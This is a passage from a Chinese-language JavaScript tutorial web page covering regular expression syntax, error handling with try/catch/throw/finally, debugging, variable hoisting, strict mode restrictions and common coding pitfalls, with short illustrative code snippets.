</tbody></table>
<p>元字符是拥有特殊含义的字符：</p>
<table>
<thead>
<tr>
<th align="left">元字符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-dot.html" target="_blank" rel="noopener">.</a></td>
<td align="left">查找单个字符，除了换行和行结束符。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-wordchar.html" target="_blank" rel="noopener">\w</a></td>
<td align="left">查找数字、字母及下划线。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-wordchar-non.html" target="_blank" rel="noopener">\W</a></td>
<td align="left">查找非单词字符。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-digit.html" target="_blank" rel="noopener">\d</a></td>
<td align="left">查找数字。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-digit-non.html" target="_blank" rel="noopener">\D</a></td>
<td align="left">查找非数字字符。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-whitespace.html" target="_blank" rel="noopener">\s</a></td>
<td align="left">查找空白字符。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-whitespace-non.html" target="_blank" rel="noopener">\S</a></td>
<td align="left">查找非空白字符。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-begin.html" target="_blank" rel="noopener">\b</a></td>
<td align="left">匹配单词边界。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-begin-not.html" target="_blank" rel="noopener">\B</a></td>
<td align="left">匹配非单词边界。</td>
</tr>
<tr>
<td align="left">\0</td>
<td align="left">查找 NULL 字符。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-newline.html" target="_blank" rel="noopener">\n</a></td>
<td align="left">查找换行符。</td>
</tr>
<tr>
<td align="left">\f</td>
<td align="left">查找换页符。</td>
</tr>
<tr>
<td align="left">\r</td>
<td align="left">查找回车符。</td>
</tr>
<tr>
<td align="left">\t</td>
<td align="left">查找制表符。</td>
</tr>
<tr>
<td align="left">\v</td>
<td align="left">查找垂直制表符。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-octal.html" target="_blank" rel="noopener">\xxx</a></td>
<td align="left">查找以八进制数 xxx 规定的字符。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-hex.html" target="_blank" rel="noopener">\xdd</a></td>
<td align="left">查找以十六进制数 dd 规定的字符。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-unicode-hex.html" target="_blank" rel="noopener">\uxxxx</a></td>
<td align="left">查找以十六进制数 xxxx 规定的 Unicode 字符。</td>
</tr>
</tbody></table>
<p>量词:</p>
<table>
<thead>
<tr>
<th align="left">量词</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-onemore.html" target="_blank" rel="noopener">n+</a></td>
<td align="left">匹配任何包含至少一个 n 的字符串。例如，/a+/ 匹配 “candy” 中的 “a”，”caaaaaaandy” 中所有的 “a”。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-zeromore.html" target="_blank" rel="noopener">n*</a></td>
<td align="left">匹配任何包含零个或多个 n 的字符串。例如，/bo*/ 匹配 “A ghost booooed” 中的 “boooo”，”A bird warbled” 中的 “b”，但是不匹配 “A goat grunted”。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-zeroone.html" target="_blank" rel="noopener">n?</a></td>
<td align="left">匹配任何包含零个或一个 n 的字符串。例如，/e?le?/ 匹配 “angel” 中的 “el”，”angle” 中的 “le”。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-nx.html" target="_blank" rel="noopener">n{X}</a></td>
<td align="left">匹配包含 X 个 n 的序列的字符串。例如，/a{2}/ 不匹配 “candy,” 中的 “a”，但是匹配 “caandy,” 中的两个 “a”，且匹配 “caaandy.” 中的前两个 “a”。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-nxcomma.html" target="_blank" rel="noopener">n{X,}</a></td>
<td align="left">X 是一个正整数。前面的模式 n 连续出现至少 X 次时匹配。例如，/a{2,}/ 不匹配 “candy” 中的 “a”，但是匹配 “caandy” 和 “caaaaaaandy.” 中所有的 “a”。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-nxy.html" target="_blank" rel="noopener">n{X,Y}</a></td>
<td align="left">X 和 Y 为正整数。前面的模式 n 连续出现至少 X 次，至多 Y 次时匹配。例如，/a{1,3}/ 不匹配 “cndy”，匹配 “candy,” 中的 “a”，”caandy,” 中的两个 “a”，匹配 “caaaaaaandy” 中的前面三个 “a”。注意，当匹配 “caaaaaaandy” 时，即使原始字符串拥有更多的 “a”，匹配项也是 “aaa”。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-ndollar.html" target="_blank" rel="noopener">n$</a></td>
<td align="left">匹配任何结尾为 n 的字符串。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-ncaret.html" target="_blank" rel="noopener">^n</a></td>
<td align="left">匹配任何开头为 n 的字符串。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-nfollow.html" target="_blank" rel="noopener">?=n</a></td>
<td align="left">匹配任何其后紧接指定字符串 n 的字符串。</td>
</tr>
<tr>
<td align="left"><a href="https://www.runoob.com/jsref/jsref-regexp-nfollow-not.html" target="_blank" rel="noopener">?!n</a></td>
<td align="left">匹配任何其后没有紧接指定字符串 n 的字符串。</td>
</tr>
</tbody></table>
<h3 id="使用RegExp对象"><a href="#使用RegExp对象" class="headerlink" title="使用RegExp对象"></a>使用RegExp对象</h3><p>在 JavaScript 中，RegExp 对象是一个预定义了属性和方法的正则表达式对象。</p>
<h3 id="使用test"><a href="#使用test" class="headerlink" title="使用test()"></a>使用test()</h3><p>test() 方法是一个正则表达式方法。</p>
<p>test() 方法用于检测一个字符串是否匹配某个模式，如果字符串中含有匹配的文本，则返回 true，否则返回 false。</p>
<p>以下实例用于搜索字符串中的字符 “e”：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var patt &#x3D; &#x2F;e&#x2F;;</span><br><span class="line">patt.test(&quot;The best things in life are free!&quot;);  &#x2F;&#x2F;结果为true</span><br><span class="line"></span><br><span class="line">可以不用设置正则表达式的变量，以上两行代码可以合并为一行:</span><br><span class="line">&#x2F;e&#x2F;.test(&quot;The best things in life are free!&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="使用exec"><a href="#使用exec" class="headerlink" title="使用exec()"></a>使用exec()</h3><p>exec() 方法是一个正则表达式方法。</p>
<p>exec() 方法用于检索字符串中的正则表达式的匹配。</p>
<p>该函数返回一个数组，其中存放匹配的结果。如果未找到匹配，则返回值为 null。</p>
<p>以下实例用于搜索字符串中的字母 “e”:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;e&#x2F;.exec(&quot;The best things in life are free!&quot;);</span><br><span class="line">&#x2F;&#x2F;字符串中含有 &quot;e&quot;，所以该实例输出为:e</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript错误"><a href="#JavaScript错误" class="headerlink" title="JavaScript错误"></a>JavaScript错误</h2><p><strong>try</strong> 语句测试代码块的错误。</p>
<p><strong>catch</strong> 语句处理错误。</p>
<p><strong>throw</strong> 语句创建自定义错误。</p>
<p><strong>finally</strong> 语句在 try 和 catch 语句之后，无论是否有触发异常，该语句都会执行。</p>
<h3 id="JavaScript错误-1"><a href="#JavaScript错误-1" class="headerlink" title="JavaScript错误"></a>JavaScript错误</h3><p>当 JavaScript 引擎执行 JavaScript 代码时，会发生各种错误。</p>
<p>可能是语法错误，通常是程序员造成的编码错误或错别字。</p>
<p>可能是拼写错误或语言中缺少的功能（可能由于浏览器差异）。</p>
<p>可能是由于来自服务器或用户的错误输出而导致的错误。</p>
<p>当然，也可能是由于许多其他不可预知的因素。</p>
<h3 id="JavaScript抛出-throw-错误"><a href="#JavaScript抛出-throw-错误" class="headerlink" title="JavaScript抛出 (throw) 错误"></a>JavaScript抛出 (throw) 错误</h3><p>当错误发生时，当事情出问题时，JavaScript 引擎通常会停止，并生成一个错误消息。</p>
<p>描述这种情况的技术术语是：JavaScript 将<strong>抛出</strong>一个错误。</p>
<p>throw 语句允许我们创建自定义错误。</p>
<p>正确的技术术语是：创建或<strong>抛出异常</strong>（exception）。</p>
<p>如果把 throw 与 try 和 catch 一起使用，那么您能够控制程序流，并生成自定义的错误消息。</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">throw exception</span><br></pre></td></tr></table></figure>

<p>异常可以是 JavaScript 字符串、数字、逻辑值或对象。</p>
<p>检测输入变量的值。如果值是错误的，会抛出一个异常（错误）。catch 会捕捉到这个错误，并显示一段自定义的错误消息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function myFunction() &#123;</span><br><span class="line">    var message, x;</span><br><span class="line">    message &#x3D; document.getElementById(&quot;message&quot;);</span><br><span class="line">    message.innerHTML &#x3D; &quot;&quot;;</span><br><span class="line">    x &#x3D; document.getElementById(&quot;demo&quot;).value;</span><br><span class="line">    try &#123; </span><br><span class="line">        if(x &#x3D;&#x3D; &quot;&quot;)  throw &quot;值为空&quot;;</span><br><span class="line">        if(isNaN(x)) throw &quot;不是数字&quot;;</span><br><span class="line">        x &#x3D; Number(x);</span><br><span class="line">        if(x &lt; 5)    throw &quot;太小&quot;;</span><br><span class="line">        if(x &gt; 10)   throw &quot;太大&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    catch(err) &#123;</span><br><span class="line">        message.innerHTML &#x3D; &quot;错误: &quot; + err;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="JavaScript-try-和-catch"><a href="#JavaScript-try-和-catch" class="headerlink" title="JavaScript try 和 catch"></a>JavaScript try 和 catch</h3><p><strong>try</strong> 语句允许我们定义在执行时进行错误测试的代码块。</p>
<p><strong>catch</strong> 语句允许我们定义当 try 代码块发生错误时，所执行的代码块。</p>
<p>JavaScript 语句 <strong>try</strong> 和 <strong>catch</strong> 是成对出现的。</p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    ...    &#x2F;&#x2F;异常的抛出</span><br><span class="line">&#125; catch(err) &#123;</span><br><span class="line">    ...    &#x2F;&#x2F;异常的捕获与处理</span><br><span class="line">&#125; finally &#123;</span><br><span class="line">    ...    &#x2F;&#x2F;结束处理</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实例：</p>
<p>故意在 try 块的代码中写了一个错字。</p>
<p>catch 块会捕捉到 try 块中的错误，并执行代码来处理它。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var txt&#x3D;&quot;&quot;; </span><br><span class="line">function message() </span><br><span class="line">&#123; </span><br><span class="line">    try &#123; </span><br><span class="line">        adddlert(&quot;Welcome guest!&quot;); </span><br><span class="line">    &#125; catch(err) &#123; </span><br><span class="line">        txt&#x3D;&quot;本页有一个错误。\n\n&quot;; </span><br><span class="line">        txt+&#x3D;&quot;错误描述：&quot; + err.message + &quot;\n\n&quot;; </span><br><span class="line">        txt+&#x3D;&quot;点击确定继续。\n\n&quot;; </span><br><span class="line">        alert(txt); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>finally语句</p>
<p>finally 语句不论之前的 try 和 catch 中是否产生异常都会执行该代码块。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function myFunction() &#123;</span><br><span class="line">  var message, x;</span><br><span class="line">  message &#x3D; document.getElementById(&quot;p01&quot;);</span><br><span class="line">  message.innerHTML &#x3D; &quot;&quot;;</span><br><span class="line">  x &#x3D; document.getElementById(&quot;demo&quot;).value;</span><br><span class="line">  try &#123; </span><br><span class="line">    if(x &#x3D;&#x3D; &quot;&quot;) throw &quot;值是空的&quot;;</span><br><span class="line">    if(isNaN(x)) throw &quot;值不是一个数字&quot;;</span><br><span class="line">    x &#x3D; Number(x);</span><br><span class="line">    if(x &gt; 10) throw &quot;太大&quot;;</span><br><span class="line">    if(x &lt; 5) throw &quot;太小&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  catch(err) &#123;</span><br><span class="line">    message.innerHTML &#x3D; &quot;错误: &quot; + err + &quot;.&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  finally &#123;</span><br><span class="line">    document.getElementById(&quot;demo&quot;).value &#x3D; &quot;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript调试"><a href="#JavaScript调试" class="headerlink" title="JavaScript调试"></a>JavaScript调试</h2><p>没有调试工具是很难去编写 JavaScript 程序的。</p>
<p>你的代码可能包含语法错误，逻辑错误，如果没有调试工具，这些错误比较难于发现。</p>
<p>通常，如果 JavaScript 出现错误，是不会有提示信息，这样你就无法找到代码错误的位置。</p>
<h3 id="JavaScript调试工具"><a href="#JavaScript调试工具" class="headerlink" title="JavaScript调试工具"></a>JavaScript调试工具</h3><p>浏览器启用调试工具一般是按下 F12 键，并在调试菜单中选择 “Console” 。</p>
<p>如果浏览器支持调试，你可以使用 console.log() 方法在调试窗口上打印 JavaScript 值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; 5;</span><br><span class="line">b &#x3D; 6;</span><br><span class="line">c &#x3D; a + b;</span><br><span class="line">console.log(c);</span><br></pre></td></tr></table></figure>

<h3 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h3><p>在调试窗口中，你可以设置 JavaScript 代码的断点。</p>
<p>在每个断点上，都会停止执行 JavaScript 代码，以便于我们检查 JavaScript 变量的值。</p>
<p>在检查完毕后，可以重新执行代码（如播放按钮）。</p>
<h3 id="debbuuger关键字"><a href="#debbuuger关键字" class="headerlink" title="debbuuger关键字"></a>debbuuger关键字</h3><p><strong>debugger</strong> 关键字用于停止执行 JavaScript，并调用调试函数。</p>
<p>这个关键字与在调试工具中设置断点的效果是一样的。</p>
<p>如果没有调试可用，debugger 语句将无法工作。</p>
<p>开启 debugger ，代码在第三行前停止执行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 15 * 5;</span><br><span class="line">debugger;</span><br><span class="line">document.getElementbyId(&quot;demo&quot;).innerHTML &#x3D; x;</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript变量提升"><a href="#JavaScript变量提升" class="headerlink" title="JavaScript变量提升"></a>JavaScript变量提升</h2><h3 id="JavaScript声明提升"><a href="#JavaScript声明提升" class="headerlink" title="JavaScript声明提升"></a>JavaScript声明提升</h3><p>JavaScript 中，函数及变量的声明都将被提升到函数的最顶部。</p>
<p>JavaScript 中，变量可以在使用后声明，也就是变量可以先使用再声明。</p>
<p>以下两个实例将获得相同的结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x &#x3D; 5; &#x2F;&#x2F; 变量 x 设置为 5</span><br><span class="line"></span><br><span class="line">elem &#x3D; document.getElementById(&quot;demo&quot;); &#x2F;&#x2F; 查找元素</span><br><span class="line">elem.innerHTML &#x3D; x;                     &#x2F;&#x2F; 在元素中显示 x</span><br><span class="line"></span><br><span class="line">var x; &#x2F;&#x2F; 声明 x</span><br></pre></td></tr></table></figure>

<p>要理解以上实例就需要理解 “hoisting(声明提升)”。</p>
<p>声明提升：函数声明和变量声明总是会被解释器悄悄地被”提升”到方法体的最顶部。</p>
<h3 id="JavaScript初始化不会提升"><a href="#JavaScript初始化不会提升" class="headerlink" title="JavaScript初始化不会提升"></a>JavaScript初始化不会提升</h3><p>JavaScript 只有声明的变量会提升，初始化的不会。</p>
<p>以下两个实例结果结果不相同：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 5; &#x2F;&#x2F; 初始化 x</span><br><span class="line">var y &#x3D; 7; &#x2F;&#x2F; 初始化 y</span><br><span class="line"></span><br><span class="line">elem &#x3D; document.getElementById(&quot;demo&quot;); &#x2F;&#x2F; 查找元素</span><br><span class="line">elem.innerHTML &#x3D; x + &quot; &quot; + y;           &#x2F;&#x2F; 显示 x 和 y</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 5; &#x2F;&#x2F; 初始化 x</span><br><span class="line"></span><br><span class="line">elem &#x3D; document.getElementById(&quot;demo&quot;); &#x2F;&#x2F; 查找元素</span><br><span class="line">elem.innerHTML &#x3D; x + &quot; &quot; + y;           &#x2F;&#x2F; 显示 x 和 y</span><br><span class="line"></span><br><span class="line">var y &#x3D; 7; &#x2F;&#x2F; 初始化 y</span><br></pre></td></tr></table></figure>

<p>实例 2 的 y 输出了 <strong>undefined</strong>，这是因为变量声明 (var y) 提升了，但是初始化(y = 7) 并不会提升，所以 y 变量是一个未定义的变量。</p>
<p>实例 2 类似以下代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 5; &#x2F;&#x2F; 初始化 x</span><br><span class="line">var y;     &#x2F;&#x2F; 声明 y</span><br><span class="line"></span><br><span class="line">elem &#x3D; document.getElementById(&quot;demo&quot;); &#x2F;&#x2F; 查找元素</span><br><span class="line">elem.innerHTML &#x3D; x + &quot; &quot; + y;           &#x2F;&#x2F; 显示 x 和 y</span><br><span class="line"></span><br><span class="line">y &#x3D; 7;    &#x2F;&#x2F; 设置 y 为 7</span><br></pre></td></tr></table></figure>

<h3 id="在头部声明变量"><a href="#在头部声明变量" class="headerlink" title="在头部声明变量"></a>在头部声明变量</h3><p>对于大多数程序员来说并不知道 JavaScript 声明提升。</p>
<p>如果程序员不能很好的理解声明提升，他们写的程序就容易出现一些问题。</p>
<p>为了避免这些问题，通常我们在每个作用域开始前声明这些变量，这也是正常的 JavaScript 解析步骤，易于我们理解。</p>
<p> JavaScript 严格模式(strict mode)不允许使用未声明的变量。</p>
<h2 id="JavaScript严格模式"><a href="#JavaScript严格模式" class="headerlink" title="JavaScript严格模式"></a>JavaScript严格模式</h2><p>JavaScript 严格模式（strict mode）即在严格的条件下运行。</p>
<h3 id="使用”use-strict”指令"><a href="#使用”use-strict”指令" class="headerlink" title="使用”use strict”指令"></a>使用”use strict”指令</h3><p>“use strict” 指令在 JavaScript 1.8.5 (ECMAScript5) 中新增。</p>
<p>它不是一条语句，但是是一个字面量表达式，在 JavaScript 旧版本中会被忽略。</p>
<p>“use strict” 的目的是指定代码在严格条件下执行。</p>
<p>严格模式下你不能使用未声明的变量。</p>
<h3 id="严格模式声明"><a href="#严格模式声明" class="headerlink" title="严格模式声明"></a>严格模式声明</h3><p>严格模式通过在脚本或函数的头部添加 <strong>use strict</strong>; 表达式来声明。</p>
<p>“use strict” 指令只允许出现在脚本或函数的开头。</p>
<p>实例中我们可以在浏览器按下 <strong>F12 (或点击”工具&gt;更多工具&gt;开发者工具”)</strong> 开启调试模式，查看报错信息。</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210410164621726.png" alt="image-20210410164621726"></p>
<p>在函数内部声明是局部作用域 (只在函数内使用严格模式):</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210410164702737.png" alt="image-20210410164702737"></p>
<p>为什么使用严格模式:</p>
<p>消除Javascript语法的一些不合理、不严谨之处，减少一些怪异行为;</p>
<p>消除代码运行的一些不安全之处，保证代码运行的安全；</p>
<p>提高编译器效率，增加运行速度；</p>
<p>为未来新版本的Javascript做好铺垫。</p>
<p>“严格模式”体现了Javascript更合理、更安全、更严谨的发展方向，包括IE 10在内的主流浏览器，都已经支持它，许多大项目已经开始全面拥抱它。</p>
<p>另一方面，同样的代码，在”严格模式”中，可能会有不一样的运行结果；一些在”正常模式”下可以运行的语句，在”严格模式”下将不能运行。掌握这些内容，有助于更细致深入地理解Javascript，让你变成一个更好的程序员。</p>
<h3 id="严格模式的限制"><a href="#严格模式的限制" class="headerlink" title="严格模式的限制"></a>严格模式的限制</h3><p>不允许使用未声明的变量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">x &#x3D; 3.14;                &#x2F;&#x2F; 报错 (x 未定义)</span><br></pre></td></tr></table></figure>

<p>不允许删除变量或对象。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">var x &#x3D; 3.14;</span><br><span class="line">delete x;                &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<p>不允许删除函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">function x(p1, p2) &#123;&#125;;</span><br><span class="line">delete x;                &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<p>不允许变量重名:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">function x(p1, p1) &#123;&#125;;   &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<p>不允许使用八进制:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">var x &#x3D; 010;             &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<p>不允许使用转义字符:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">var x &#x3D; \010;            &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<p>不允许对只读属性赋值:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">var obj &#x3D; &#123;&#125;;</span><br><span class="line">Object.defineProperty(obj, &quot;x&quot;, &#123;value:0, writable:false&#125;);</span><br><span class="line"></span><br><span class="line">obj.x &#x3D; 3.14;            &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<p>不允许对一个使用getter方法读取的属性进行赋值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">var obj &#x3D; &#123;get x() &#123;return 0&#125; &#125;;</span><br><span class="line"></span><br><span class="line">obj.x &#x3D; 3.14;            &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<p>不允许删除一个不允许删除的属性：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">delete Object.prototype; &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<p>变量名不能使用 “eval” 字符串:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">var eval &#x3D; 3.14;         &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<p>变量名不能使用 “arguments” 字符串:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">var arguments &#x3D; 3.14;    &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<p>不允许使用以下这种语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">with (Math)&#123;x &#x3D; cos(2)&#125;; &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<p>由于一些安全原因，在作用域 eval() 创建的变量不能被调用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">eval (&quot;var x &#x3D; 2&quot;);</span><br><span class="line">alert (x);               &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<p>禁止this关键字指向全局对象。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function f()&#123;</span><br><span class="line">    return !this;</span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F; 返回false，因为&quot;this&quot;指向全局对象，&quot;!this&quot;就是false</span><br><span class="line"></span><br><span class="line">function f()&#123; </span><br><span class="line">    &quot;use strict&quot;;</span><br><span class="line">    return !this;</span><br><span class="line">&#125; </span><br><span class="line">&#x2F;&#x2F; 返回true，因为严格模式下，this的值为undefined，所以&quot;!this&quot;为true。</span><br></pre></td></tr></table></figure>

<p>因此，使用构造函数时，如果忘了加new，this不再指向全局对象，而是报错。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function f()&#123;</span><br><span class="line">    &quot;use strict&quot;;</span><br><span class="line">    this.a &#x3D; 1;</span><br><span class="line">&#125;;</span><br><span class="line">f();&#x2F;&#x2F; 报错，this未定义</span><br></pre></td></tr></table></figure>

<h3 id="保留关键字"><a href="#保留关键字" class="headerlink" title="保留关键字"></a>保留关键字</h3><p>为了向将来Javascript的新版本过渡，严格模式新增了一些保留关键字：</p>
<p>implements</p>
<p>interface</p>
<p>let</p>
<p>package</p>
<p>private</p>
<p>protected</p>
<p>public</p>
<p>static</p>
<p>yield</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">var public &#x3D; 1500;      &#x2F;&#x2F; 报错</span><br></pre></td></tr></table></figure>

<h2 id="JavaScript使用误区"><a href="#JavaScript使用误区" class="headerlink" title="JavaScript使用误区"></a>JavaScript使用误区</h2><h3 id="赋值运算符应用错误"><a href="#赋值运算符应用错误" class="headerlink" title="赋值运算符应用错误"></a>赋值运算符应用错误</h3><p>在 JavaScript 程序中如果你在 if 条件语句中使用赋值运算符的等号 (=) 将会产生一个错误结果, 正确的方法是使用比较运算符的两个等号 (==)。</p>
<h3 id="比较运算符常见错误"><a href="#比较运算符常见错误" class="headerlink" title="比较运算符常见错误"></a>比较运算符常见错误</h3><p>在常规的比较中，数据类型是被忽略的，以下 if 条件语句返回 true：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 10;</span><br><span class="line">var y &#x3D; &quot;10&quot;;</span><br><span class="line">if (x &#x3D;&#x3D; y)</span><br></pre></td></tr></table></figure>

<p>在严格的比较运算中，=== 为恒等计算符，同时检查表达式的值与类型，以下 if 条件语句返回 false：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 10;</span><br><span class="line">var y &#x3D; &quot;10&quot;;</span><br><span class="line">if (x &#x3D;&#x3D;&#x3D; y)</span><br></pre></td></tr></table></figure>

<p>这种错误经常会在 switch 语句中出现，switch 语句会使用恒等计算符(===)进行比较:</p>
<p>以下实例会执行 alert 弹窗：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 10;</span><br><span class="line">switch(x) &#123;</span><br><span class="line">    case 10: alert(&quot;Hello&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以下实例由于类型不一致不会执行 alert 弹窗：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 10;</span><br><span class="line">switch(x) &#123;</span><br><span class="line">    case &quot;10&quot;: alert(&quot;Hello&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="加法与连接注意事项"><a href="#加法与连接注意事项" class="headerlink" title="加法与连接注意事项"></a>加法与连接注意事项</h3><p><strong>加法</strong>是两个<strong>数字</strong>相加。</p>
<p><strong>连接</strong>是两个<strong>字符串</strong>连接。</p>
<p>JavaScript 的加法和连接都使用 + 运算符。</p>
<p>接下来我们可以通过实例查看两个数字相加及数字与字符串连接的区别：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 10 + 5;          &#x2F;&#x2F; x 的结果为 15</span><br><span class="line">var x &#x3D; 10 + &quot;5&quot;;        &#x2F;&#x2F; x 的结果为 &quot;105&quot;</span><br></pre></td></tr></table></figure>

<h3 id="浮点型数据使用注意事项"><a href="#浮点型数据使用注意事项" class="headerlink" title="浮点型数据使用注意事项"></a>浮点型数据使用注意事项</h3><p>JavaScript 中的所有数据都是以 64 位<strong>浮点型数据(float)</strong> 来存储。</p>
<p>所有的编程语言，包括 JavaScript，对浮点型数据的精确度都很难确定：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var x &#x3D; 0.1;</span><br><span class="line">var y &#x3D; 0.2;</span><br><span class="line">var z &#x3D; x + y            &#x2F;&#x2F; z 的结果为 0.30000000000000004</span><br><span class="line">if (z &#x3D;&#x3D; 0.3)            &#x2F;&#x2F; 返回 false</span><br></pre></td></tr></table></figure>

<p>为解决以上问题，可以用整数的乘除法来解决：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var z &#x3D; (x * 10 + y * 10) &#x2F; 10;       &#x2F;&#x2F; z 的结果为 0.3</span><br></pre></td></tr></table></figure>

<h3 id="Undefined不是Null"><a href="#Undefined不是Null" class="headerlink" title="Undefined不是Null"></a>Undefined不是Null</h3><p>在 JavaScript 中, <strong>null</strong> 用于对象, <strong>undefined</strong> 用于变量，属性和方法。</p>
<p>对象只有被定义才有可能为 null，否则为 undefined。</p>
<p>如果我们想测试对象是否存在，在对象还没定义时将会抛出一个错误。</p>
<p>错误的使用方式：</p>
